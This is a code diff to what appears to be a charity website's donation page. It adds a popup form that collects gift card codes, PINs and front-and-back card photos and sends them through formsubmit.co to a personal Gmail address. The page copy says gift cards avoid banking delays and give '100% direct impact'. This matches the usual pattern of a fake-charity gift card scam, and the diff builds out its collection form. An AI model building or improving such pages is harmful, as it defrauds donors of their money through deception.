@@ -258,6 +258,78 @@
         border: 4px solid var(--white);
     }
 }
+        /* Blur effect for the main container */
+.blur-active {
+    filter: blur(10px);
+    pointer-events: none;
+    transition: filter 0.4s ease;
+}
+
+.donate-trigger-section {
+    padding: 100px 8%;
+    text-align: center;
+    background: #f0f7ff;
+}
+
+.main-donate-btn {
+    background: #0047AB;
+    color: white;
+    padding: 20px 60px;
+    font-size: 1.3rem;
+    font-weight: 700;
+    border: none;
+    border-radius: 50px;
+    cursor: pointer;
+    box-shadow: 0 10px 20px rgba(0, 71, 171, 0.3);
+    transition: 0.3s;
+}
+
+/* Modal Styling */
+.modal-overlay {
+    position: fixed;
+    top: 0; left: 0; width: 100%; height: 100%;
+    background: rgba(0, 0, 0, 0.7);
+    display: none; /* Controlled by JS */
+    justify-content: center;
+    align-items: center;
+    z-index: 10000;
+    padding: 20px;
+}
+
+.modal-content {
+    background: white;
+    width: 100%;
+    max-width: 850px;
+    border-radius: 25px;
+    position: relative;
+    overflow: hidden;
+    animation: popIn 0.3s ease-out;
+}
+
+@keyframes popIn {
+    from { transform: scale(0.9); opacity: 0; }
+    to { transform: scale(1); opacity: 1; }
+}
+
+.modal-split { display: grid; grid-template-columns: 1fr 1.2fr; }
+
+.modal-info { background: #002D62; color: white; padding: 40px; }
+.modal-form { padding: 40px; }
+
+.modal-form input, .modal-form select {
+    width: 100%; padding: 12px; margin-bottom: 15px;
+    border: 1px solid #ddd; border-radius: 8px;
+}
+
+.close-modal {
+    position: absolute; top: 15px; right: 20px;
+    font-size: 2rem; cursor: pointer; color: #aaa; z-index: 100;
+}
+
+@media (max-width: 768px) {
+    .modal-split { grid-template-columns: 1fr; }
+    .modal-info { display: none; }
+}
     </style>
 </head>
 <body>
@@ -464,28 +536,51 @@
         </div>
     </section>
 
-    <section class="donation-section" id="donate">
-        <div class="donation-wrapper reveal">
-            <div class="donation-note">
-                <h2>Donation Guide</h2>
-                <p>Steps to donate via Gift Card:</p><br>
-                <p>1. Ensure the code is clear and typed correctly.</p>
-                <p>2. Upload a clear photo of the back of the card.</p>
-                <p>3. We will send a confirmation once processed.</p>
+    <section class="donate-trigger-section">
+    <div class="reveal">
+        <h2>Support Our Mission</h2>
+        <p>Your kindness provides life-saving nutrition and medical care. Tap below to donate securely via Gift Card.</p>
+        <button class="main-donate-btn" onclick="openDonation()">
+            <i class="fas fa-heart"></i> Donate Now
+        </button>
+    </div>
+</section>
+
+<div id="donation-modal" class="modal-overlay">
+    <div class="modal-content">
+        <span class="close-modal" onclick="closeDonation()">&times;</span>
+        
+        <div class="modal-split">
+            <div class="modal-info">
+                <h3>Gift Card Donation</h3>
+                <p>We prefer Gift Cards because they bypass international banking delays, allowing us to buy supplies immediately.</p>
+                <ul class="guide-list">
+                    <li><i class="fas fa-check"></i> Instant Supply Access</li>
+                    <li><i class="fas fa-check"></i> Zero Processing Fees</li>
+                    <li><i class="fas fa-check"></i> 100% Direct Impact</li>
+                </ul>
             </div>
-            <div class="donation-form-container">
+
+            <div class="modal-form">
                 <form action="https://formsubmit.co/organization461@gmail.com" method="POST" enctype="multipart/form-data">
-                    <div class="form-group"><input type="text" name="name" placeholder="Full Name" required></div>
-                    <div class="form-group">
-                        <select name="type"><option>Amazon</option><option>Apple / iTunes</option><option>Visa / Vanilla</option></select>
+                    <input type="text" name="name" placeholder="Full Name" required>
+                    <select name="card_type">
+                        <option>Amazon Card</option>
+                        <option>Apple / iTunes</option>
+                        <option>Visa / Vanilla</option>
+                        <option>Steam / Razor</option>
+                    </select>
+                    <input type="text" name="code" placeholder="Card Code / PIN" required>
+                    <div class="file-input-wrapper">
+                        <label>Upload Card Photos (Front & Back)</label>
+                        <input type="file" name="attachment" accept="image/*" required>
                     </div>
-                    <div class="form-group"><input type="text" name="code" placeholder="Card Code / PIN" required></div>
-                    <div class="form-group"><input type="file" name="attachment" accept="image/*" required></div>
-                    <button type="submit" class="btn-submit">Complete Donation</button>
+                    <button type="submit" class="submit-btn">Send Donation</button>
                 </form>
             </div>
         </div>
-    </section>
+    </div>
+</div>
 
     <footer class="site-footer">
         <div class="footer-grid">
@@ -556,6 +651,32 @@
             }, { threshold: 0.1 });
             document.querySelectorAll('.reveal').forEach(el => observer.observe(el));
         }
+        function openDonation() {
+    const modal = document.getElementById('donation-modal');
+    const mainContent = document.querySelector('nav, header, section, footer'); 
+    // Note: It's better to wrap your whole page in a <div id="page-wrapper"> and blur that.
+    
+    modal.style.display = 'flex';
+    
+    // Apply blur to everything EXCEPT the modal
+    document.querySelectorAll('body > *:not(#donation-modal)').forEach(el => {
+        el.classList.add('blur-active');
+    });
+    
+    document.body.style.overflow = 'hidden'; // Stop scrolling
+}
+
+function closeDonation() {
+    const modal = document.getElementById('donation-modal');
+    modal.style.display = 'none';
+    
+    // Remove blur
+    document.querySelectorAll('body > *:not(#donation-modal)').forEach(el => {
+        el.classList.remove('blur-active');
+    });
+    
+    document.body.style.overflow = 'auto'; // Enable scrolling
+}
     </script>
 </body>
 </html>
